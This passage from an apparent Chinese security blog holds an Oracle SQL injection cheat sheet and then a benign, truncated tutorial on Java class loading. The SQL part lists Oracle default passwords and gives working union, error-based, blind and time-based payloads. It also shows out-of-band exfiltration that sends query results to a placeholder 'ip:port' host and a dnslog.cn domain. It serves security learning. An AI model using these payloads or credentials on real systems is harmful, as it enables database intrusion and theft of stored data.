id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h4><p><strong>特殊核心表</strong>：</p><p>dual：是一个虚拟表，用来构成select的语法规则，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select null,null from dual</span><br></pre></td></tr></table></figure><p>能查询表信息的<strong>系统表</strong>：</p><p><code>dba_tables</code> : 系统里<strong>所有的表的信息</strong>，需要DBA权限才能查询</p><p><code>all_tables</code> : <strong>当前用户有权限的表的信息</strong>（只要对某个表有任何权限，即可在此视图中看到表的相关信息）</p><p><code>user_tables</code>: <strong>当前用户名下的表的信息</strong></p><p>（关键字段：table_name）</p><p>能查询列信息的<strong>系统表</strong>：</p><p><code>dba_tab_columns</code>：对应 <strong>dba_tables表 包含的所有表的列信息</strong></p><p><code>all_tab_columns</code>：对应 <strong>all_tables表 包含的所有表的列信息</strong></p><p><code>user_tab_columns</code>：对应 <strong>user_tables表 包含的所有表的列信息</strong></p><p> （关键字段：<code>table_name,column_name,data_type,data_length</code>）</p><p><strong>内置默认账号</strong>:</p><table><thead><tr><th><strong>用户名&#x2F;密码</strong></th><th><strong>登录身份</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>sys&#x2F;change_on_install</td><td>SYSDBA 或 SYSOPER</td><td>不能以 NORMAL 登录，可作为默认的系统管理员</td></tr><tr><td>system&#x2F;manager</td><td>SYSDBA 或 NORMAL</td><td>不能以 SYSOPER 登录，可作为默认的系统管理员</td></tr><tr><td>sysman&#x2F;oem_temp</td><td>sysman</td><td>为 oms 的用户名</td></tr><tr><td>scott&#x2F;tiger</td><td>NORMAL</td><td>普通用户</td></tr><tr><td>aqadm&#x2F;aqadm</td><td>SYSDBA 或 NORMAL</td><td>高级队列管理员</td></tr><tr><td>dbsnmp&#x2F;dbsnmp</td><td>SYSDBA 或 NORMAL</td><td>复制管理员</td></tr></tbody></table><p><strong>oracle特点</strong>：</p><ul><li><p><strong>不支持堆叠查询</strong></p><p>可以尝试提交多语句支持符号 <code>;</code>，如果支持多行查询，说明是MSSQL或MySQL，不支持则是 Oracle</p></li><li><p>使用<strong>查询语句必须跟上表名</strong>，如果没有表则使用 <strong>dual 表</strong></p></li><li><p><strong>Oracle的数据类型是强匹配的</strong></p><p>在进行类似union查询数据时候必须让<strong>对应位置上的数据类型和表中的列的数据类型是一致的</strong>，也可以使用<strong>null代替某些无法快速猜测出数据类型的位置</strong>。</p></li><li><p><strong>没有limit语句</strong></p><p>一般使用 <code>where rownum=1</code> 语句代替</p></li><li><p><strong>有 user_tables 等其它类型数据库没有的表</strong></p></li><li><p><strong>当前数据库名就是当前用户名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user from dual </span><br></pre></td></tr></table></figure><p>其实就是<strong>同时获取数据库名和用户名</strong></p></li><li><p><strong>可用的注释符</strong></p><p>单行注释<code>--</code> 和 多行注释<code>/**/</code>，只有MySQL才支持<code>#</code>注释符</p></li><li><p><strong>oracle没有if函数</strong></p><p>一般进行布尔盲注时一般使用<strong>decode()或者instr()函数，或者使用 case when语句</strong></p></li><li><p><strong>可通过<code>||</code>拼接字符</strong></p></li></ul><h4 id="注入姿势-2"><a href="#注入姿势-2" class="headerlink" title="注入姿势"></a>注入姿势</h4><h5 id="联合注入-1"><a href="#联合注入-1" class="headerlink" title="联合注入"></a>联合注入</h5><ul><li><p><strong>判断字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4--+</span><br></pre></td></tr></table></figure></li><li><p><strong>对每列数据类型进行判断</strong></p><p>有用Oracle是强比较，需要数据类型一致，我们可以默认每一列均为null，然后从第一列开始依次将<strong>null改为字符串，如果报错则说明该列是数字型</strong>，否则则是字符型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select null,null from dual</span><br><span class="line"></span><br><span class="line">?id=-1 union select &#x27;null&#x27;,&#x27;null&#x27; from dual</span><br></pre></td></tr></table></figure></li><li><p><strong>信息获取</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#获取数据库信息</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select banner from sys.v_$version where rownum=1) from dual</span><br><span class="line">#获取当前用户</span><br><span class="line">?id=-1 union select &#x27;1&#x27;,user from dual</span><br><span class="line">#获取当前环境</span><br><span class="line">?id=-1 union select &#x27;1&#x27;,(select SYS_CONTEXT (&#x27;USERENV&#x27;, &#x27;CURRENT_USER&#x27;) from dual) from dual</span><br></pre></td></tr></table></figure><blockquote><p><code>sys.v_$version</code>：Oracle 的系统视图（System View），用于展示数据库的版本信息。</p><p><code>banner</code>：存储版本描述字符串的字段。</p></blockquote></li><li><p><strong>获取库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select &#x27;null&#x27;,(select instance_name from V$INSTANCE) from dual</span><br></pre></td></tr></table></figure></li><li><p><strong>获取表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#第一个表名</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1) from dual</span><br><span class="line">#第二个表名</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27;) from dual</span><br><span class="line"></span><br><span class="line">#模糊字段找表名</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where table_name like &#x27;%user%&#x27; and rownum=1) from dual</span><br></pre></td></tr></table></figure></li><li><p><strong>找列名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#第一列</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1) from dual</span><br><span class="line">#第二列</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27;) from dual</span><br><span class="line"></span><br><span class="line">#模糊查询</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27;) from dual</span><br></pre></td></tr></table></figure></li><li><p><strong>找数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1</span><br></pre></td></tr></table></figure></li></ul><h5 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h5><p>报错注入是一种通过函数报错前进行子查询获取数据，再通过错误页面回显的一种注入手法</p><h6 id="ctxsys-drithsx-sn"><a href="#ctxsys-drithsx-sn" class="headerlink" title="ctxsys.drithsx.sn()"></a>ctxsys.drithsx.sn()</h6><p><code>ctxsys.drithsx.sn</code> 的第二个参数<strong>预期接受特定格式的文本索引标识符</strong>（如数字或合法名称）。</p><p>而当传入<strong>非预期的字符串</strong>（例如 <code>SCOTT</code>）时，函数无法正确处理，抛出错误。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --</span><br></pre></td></tr></table></figure><blockquote><p>第二个参数类型不符号报错</p><p>其中<code>1=</code>让函数结果与 <code>1</code> 进行比较，从而强制执行函数并触发错误。</p></blockquote><h6 id="utl-inaddr-get-host-name"><a href="#utl-inaddr-get-host-name" class="headerlink" title="utl_inaddr.get_host_name()"></a>utl_inaddr.get_host_name()</h6><p><code>utl_inaddr.get_host_address</code> 本意是获取<strong>ip 地址</strong>，但是如果<strong>传递参数无法得到解析</strong>就会返回一个oracle 错误并显示传递的参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=utl_inaddr.get_host_name((select user from dual))--</span><br></pre></td></tr></table></figure><h6 id="XMLType"><a href="#XMLType" class="headerlink" title="XMLType()"></a>XMLType()</h6><p>Oracle 的 <code>XMLType()</code> 函数会尝试将一个字符串转换为 XML 数据类型，通过构造<code>&lt;:...&gt;</code>从而<strong>抛出 XML 解析错误</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --</span><br></pre></td></tr></table></figure><blockquote><p><code>||</code>拼接</p><p><code>upper()</code> 是为了触发数据类型转换、强制处理</p><p><code>is not null</code> 是为了让整个表达式合法</p></blockquote><h6 id="dbms-xdb-version-checkin"><a href="#dbms-xdb-version-checkin" class="headerlink" title="dbms_xdb_version.checkin()"></a>dbms_xdb_version.checkin()</h6><p>Oracle 的 <code>DBMS_XDB_VERSION</code> 是一个内部 PL&#x2F;SQL 包，当给<code>checkin()</code>传入<strong>错误的数据类型</strong>（比如传入了一个超长字符串或格式不合规的值），就会触发异常。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null --</span><br></pre></td></tr></table></figure><h6 id="bms-xdb-version-makeversioned"><a href="#bms-xdb-version-makeversioned" class="headerlink" title="bms_xdb_version.makeversioned()"></a>bms_xdb_version.makeversioned()</h6><p><code>bms_xdb_version.makeversioned()</code>是 Oracle XML DB 的一个过程，用于对数据库对象进行“版本控制”。当传入的不是 XMLDB 所期望的对象（如不存在的表名、格式非法），就会抛出异常。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure><h6 id="dbms-utility-sqlid-to-sqlhash"><a href="#dbms-utility-sqlid-to-sqlhash" class="headerlink" title="dbms_utility.sqlid_to_sqlhash()"></a>dbms_utility.sqlid_to_sqlhash()</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure><h5 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><h6 id="decode"><a href="#decode" class="headerlink" title="decode()"></a>decode()</h6><p>decode(字段或字段的运算，值1，值2，值3）<br>当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3</p><ul><li><p><strong>获取表数量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(table_name) from user_tables)&gt;1--</span><br></pre></td></tr></table></figure></li><li><p><strong>获取第一个表长</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select length(table_name) from user_tables where rownum=1)&gt;8--</span><br></pre></td></tr></table></figure></li><li><p><strong>获取表的第一个ascii码的值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select table_name from user_tables where rownum=1),0,1))&gt;82--</span><br></pre></td></tr></table></figure></li><li><p><strong>判断值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(1),0) from dual) --</span><br></pre></td></tr></table></figure><blockquote><p>如果用户名第一个字符为S则返回1，否则返回默认值</p></blockquote></li></ul><h6 id="instr"><a href="#instr" class="headerlink" title="instr()"></a>instr()</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">instr((select user from dual),&#x27;s&#x27;)</span><br></pre></td></tr></table></figure><p><strong>instr会返回s在用户名中的位置，未找到就返回0</strong></p><h5 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h5><h6 id="dbms-pipe-receive-message"><a href="#dbms-pipe-receive-message" class="headerlink" title="dbms_pipe.receive_message()"></a>dbms_pipe.receive_message()</h6><p>DBMS_PIPE.RECEIVE_MESSAGE()是 Oracle 的一个 PL&#x2F;SQL 包函数，用于<strong>跨会话通信</strong>，让一个会话等待另一个发送消息。这里可以通过利用管道接受消息造成时间延迟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBMS_PIPE.RECEIVE_MESSAGE(&#x27;pipe_name&#x27;, timeout_in_seconds);</span><br></pre></td></tr></table></figure><blockquote><p>如果<strong>没有人向这个 pipe 发消息</strong>，这个函数就会<strong>挂起当前会话，直到超时</strong>。</p></blockquote><p>检查是否存在漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=dbms_pipe.receive_message(&#x27;o&#x27;, 10)--</span><br></pre></td></tr></table></figure><p>配合decode实现延迟：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --</span><br></pre></td></tr></table></figure><h6 id="decode-耗时操作"><a href="#decode-耗时操作" class="headerlink" title="decode()+耗时操作"></a>decode()+耗时操作</h6><p>在无法使用<code>dbms_pipe.receive_message</code>可以使用<code>(select count(*) from all_objects) </code>因为该查询结果需要一定时间：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(select count(*) from all_objects),0) from dual) --</span><br></pre></td></tr></table></figure><h5 id="外带注入"><a href="#外带注入" class="headerlink" title="外带注入"></a>外带注入</h5><h6 id="url-http-request"><a href="#url-http-request" class="headerlink" title="url_http.request()"></a>url_http.request()</h6><p><code>UTL_HTTP.REQUEST()</code> 是 Oracle 中一个<strong>可以发出 HTTP 请求的包</strong>，通常用于集成外部 Web 服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and utl_http.request(&#x27;http://ip:port/&#x27;||(select banner from sys.v_$version where rownum=1))=1--</span><br><span class="line">#http访问时可以将||进行URL编码</span><br></pre></td></tr></table></figure><h6 id="utl-inaddr-get-host-address"><a href="#utl-inaddr-get-host-address" class="headerlink" title="utl_inaddr.get_host_address()"></a>utl_inaddr.get_host_address()</h6><p><code>utl_inaddr.get_host_address()</code>用于域名查询，他会让Oracle 数据库服务器去查询域名的 IP，相当于做一次DNS解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select utl_inaddr.get_host_address((select user from dual)||&#x27;.eeaijt.dnslog.cn&#x27;) from dual)is not null --</span><br></pre></td></tr></table></figure><h6 id="HTTPURITYPE"><a href="#HTTPURITYPE" class="headerlink" title="HTTPURITYPE()"></a>HTTPURITYPE()</h6><p><code>HTTPURITYPE</code> 是 Oracle 的一个类型，可以把 URL 当成对象来操作；</p><p><code>.GETCLOB()</code> 是它的方法之一，会尝试去<strong>访问该 URL</strong> 并获取其响应内容作为 CLOB 数据；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select HTTPURITYPE(&#x27;http://ip:port/&#x27;||(select user from dual)).GETCLOB() from dual)is not null --</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/carmi/p/18410869">https://www.cnblogs.com/carmi/p/18410869</a></p><p><a href="https://www.cnblogs.com/qianggediyi/p/15611265.html#_caption5">https://www.cnblogs.com/qianggediyi/p/15611265.html#_caption5</a></p><p><a href="https://www.freebuf.com/articles/web/404072.html">https://www.freebuf.com/articles/web/404072.html</a></p><p><a href="https://www.cnblogs.com/Mast1n/p/17778123.html">https://www.cnblogs.com/Mast1n/p/17778123.html</a></p><p><a href="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/88679754">https://blog.csdn.net/qq_36119192/article/details/88679754</a></p><p><a href="https://cloud.tencent.com/developer/article/1631806">https://cloud.tencent.com/developer/article/1631806</a></p><p><a href="https://www.cnblogs.com/PANDA-Mosen/p/13283204.html">https://www.cnblogs.com/PANDA-Mosen/p/13283204.html</a></p><p><a href="https://xz.aliyun.com/news/9823">https://xz.aliyun.com/news/9823</a></p><p><a href="https://r0fus0d.blog.ffffffff0x.com/post/mssql-pentest/#%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%86%99webshell">https://r0fus0d.blog.ffffffff0x.com/post/mssql-pentest/#%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%86%99webshell</a></p><p><a href="https://www.cnblogs.com/dubh3/p/15997687.html">https://www.cnblogs.com/dubh3/p/15997687.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java类加载机制</title>
      <link href="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
      <url>/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>JVM把描述类文件的数据从<code>.class</code>文件加载到内存，并对数据进行校验、转换、解析和类初始化，最初形成可以被JVM使用的Java类型，这个过程被称为JVM的类加载机制。</p><p>Java类加载过程机制允许在运行时加载类，而不再局限于在编译时确定依赖。这种特性赋予了Java动态性和灵活性，使得用于可以在无需重启的情况下动态的引入新功能。</p><h2 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h2><p>类的生命周期，是从加载到JVM内存开始，到卸载出JVM内存结束</p><p>整个声明周期包括：加载、验证、准备、解析、初始化、使用、卸载</p><p><img src="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/Untitled%20(1).webp"></p><p>其中从验证到解析被称为连接，从加载到初始化称为类加载。</p><h3 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h3><p>该阶段主要作用是<strong>查找并加载类的二进制数据</strong></p><p>加载阶段：</p><ul><li><strong>通过类的全限定名（包名+类名）来获取定义此类的二进制字节流</strong></li><li><strong>将这个字节流所代表的静态存储结构转化为运行时的数据结构</strong></li><li><strong>在内存中生成一个代表这个类的<code>java.lang.Class</code>对象，作为方法区这个类的各种数据的访问入口</strong></li></ul><p><img src="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/007S8ZIlly1gi57jiyydxj30ya0icdiw.webp"></p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>用于<strong>确保被加载类的正确性</strong></p><p>验证的内容：</p><ul><li><p><strong>文件格式验证</strong></p><p>验证字节流是否符合Class文件格式规范</p></li><li><p><strong>元数据验证</strong></p><p>对字节码描述的信息进行语义分析，以确保其描述的信息符合Java语言规范要求</p></li><li><p><strong>字节码验证</strong></p><p>通过数据流和控制流分析，确保程序定义是否合法、符合逻辑</p></li><li><p><strong>符号引用验证</strong></p><p>确保解析动作能正确执行</p></li></ul><p>可以考虑使用 <code>-Xverify:none</code> 参数来关闭大部分的类验证措施，以缩短JVM类加载的时间。</p><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><p><strong>为类的静态变量分配内存，并将其初始化为默认值</strong></p><p>此阶段会在JVM内存中的<strong>方法区</strong>进行：</p><ul><li><p>内存分配仅包括<strong>类静态变量</strong>，<strong>实例变量将会在对象实例化时随着对象一起分配到Java堆中。</strong></p></li><li><p>这里所设置的初始值通常情况下是<strong>数据类型默认的零值(如<code>0</code>、<code>0L</code>、<code>null</code>、<code>false</code>等)，引用类型为null</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String s;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(i);<span class="comment">//0</span></span><br><span class="line">        System.out.println(s);<span class="comment">//null</span></span><br><span class="line">        System.out.println(b);<span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>对于同时被<strong>static和final</strong>修饰的常量，必须在<strong>声明</strong>的时候就为其<strong>显示赋值</strong>；只被<strong>final</strong>修饰的常量，在<strong>使用前</strong>必须为其<strong>显示赋值</strong>，系统不会为其赋予默认零值。否则IDEA会提示未初始化</p></li></ul><h4 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h4><p><strong>把类中的符号引用转换为直接引用</strong></p><ul><li><p><strong>符号引用</strong>就是<strong>一组符号来描述目标</strong>，可以是<strong>任何字面量。</strong></p><p>例如，类<code>A</code>调用类<code>B</code>的<code>method()</code>，编译后<code>.class</code>文件中会记录<code>B</code>的类名、方法名及描述符，而非实际地址。</p></li><li><p><strong>直接引用</strong>就是直接指向<strong>目标的指针</strong>、<strong>相对偏移量</strong>或一个<strong>间接定位到目标的句柄</strong>。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类A调用类B的静态方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        B.staticMethod(); <span class="comment">// 符号引用解析为B.staticMethod()的直接地址</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticMethod</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>执行类构造器<code>&lt;clinit&gt;()</code>方法的过程，用于初始化静态变量和静态代码块</p><p>会调用<code>java.lang.ClassLoader</code>加载字节码，<code>ClassLoader</code>会调用JVM的native方法(<code>defineClass0/1/2</code>)来定义一个<code>java.lang.Class</code></p><p>其中包括：</p><ul><li><strong>执行static语句块中的语句</strong></li><li><strong>完成static属性的赋值操作</strong></li><li><strong>当类的直接父类还没有被初始化，则先初始化其父类，即父类中定义的静态语句块优先于子类的变量赋值操作</strong></li></ul><p>如果一个类中没有静态语句块，也没有对变量的赋值操作，那么编译器可以不为这个类生成<code>&lt;clinit&gt;()</code>方法。</p><h2 id="类的加载时机"><a href="#类的加载时机" class="headerlink" title="类的加载时机"></a>类的加载时机</h2><p>JVM会在程序第一次注定引用类的时候加载该类，被动引用时并不会引用类加载的操作</p><blockquote><p>被动引用可能触发类的加载，但不会触发初始化</p></blockquote><h3 id="主动引用"><a href="#主动引用" class="headerlink" title="主动引用"></a>主动引用</h3><ul><li><p>遇到<code>new</code>、<code>getstatic</code>、<code>putstatic</code>、<code>invokestatic</code>字节码指令</p><ul><li><p><code>new</code>实例化对象</p><p><code>new</code>指令需要访问类的构造函数，并分配对象内存，必须确保类已初始化</p></li><li><p><code>getstatic/putstatic</code>读取设置类的静态属性（被<code>final</code>修饰，编译期把结果放入常量池中的静态字段除外）</p></li><li><p><code>invokestatic</code>调用类的静态方法</p></li></ul></li><li><p>JVM启动，先初始化包含<code>main()</code>方法的主类</p></li><li><p>初始化一个类时，其父类还没初始化（需先初始化父类）</p></li><li><p>对类进行反射调用</p></li><li><p>JDK 1.7动态语言支持：一个<code>java.lang.invoke.MethodHandle</code>的解析结果为 <code>REF_getStatic、REF_putStatic、REF_invokeStatic</code>。</p></li></ul><h3 id="被动引用"><a href="#被动引用" class="headerlink" title="被动引用"></a>被动引用</h3><ul><li>通过子类引用父类的静态变量，不会导致子类初始化</li><li>定义类的数组类型<code>Array[] arr = new Array[10];</code>不会触发Array类初始化</li><li><code>static final VAR</code>在编译阶段会存入调用类的常量池，通过<code>ClassName.VAR</code>引用不会触发ClassName初始化</li><li>通过类名获取Class对象</li></ul><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>Java把类加载阶段中的**”通过一个类的全限名来获取描述此类的二进制字节流”这个动作放到JVM外部实现**，以便让应用程序自己决定如何去获取所需要的类，实现这个动作的代码模块称为”<strong>类加载器</strong>“。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>类加载器的分类：</p><ul><li><p><strong>启动类加载器</strong></p><p>C++语言实现，不继承<code>java.lang.ClassLoader</code>，不能被Java程序直接调用，是<strong>JVM自身的一部分</strong>。负责将<code>&lt;JAVA_HOME&gt;\lib</code>目录，或者被<code>-Xbootclasspath</code>参数所指定的路径下的类库加载到JVM内存中，<strong>用于加载Java的核心库如<code>java.lang.*</code>、<code>java.util.*</code>等。</strong></p><p>该加载器在Java中无法获取其引用（<code>ClassLoader.getParent()</code>返回<code>null</code>），是<strong>所有类加载器的祖先，没有父加载器</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 尝试获取String类的类加载器（返回null，表示由Bootstrap加载）</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> String.class.getClassLoader(); <span class="comment">// null</span></span><br></pre></td></tr></table></figure></li><li><p><strong>扩展类加载器</strong></p><p>负责加载<code>&lt;JAVA_HOME&gt;\lib\ext</code>目录下的类库，或者被<code>java.ext.dirs</code>系统变量所指定的路径中的所有类库。<strong>用于加载Java扩展库</strong>，开发者可以<strong>直接使用这个类加载器(可通过ClassLoader.getSystemClassLoader().getParent()获得)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载JDK扩展库中的类（如javax包下的类）</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">extLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().getParent();</span><br></pre></td></tr></table></figure></li><li><p><strong>应用程序类加载器</strong></p><p>这个类加载器负责加载用户路径(CLASSPATH)下的类库，一般<strong>我们编写的Java类都是由这个类加载器加载</strong>，这个类加载器是ClassLoader中的<code>getSystemClassLoader()</code>方法的返回值，所以也称为系统类加载器。一般情况下这就是<strong>系统默认的类加载器。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 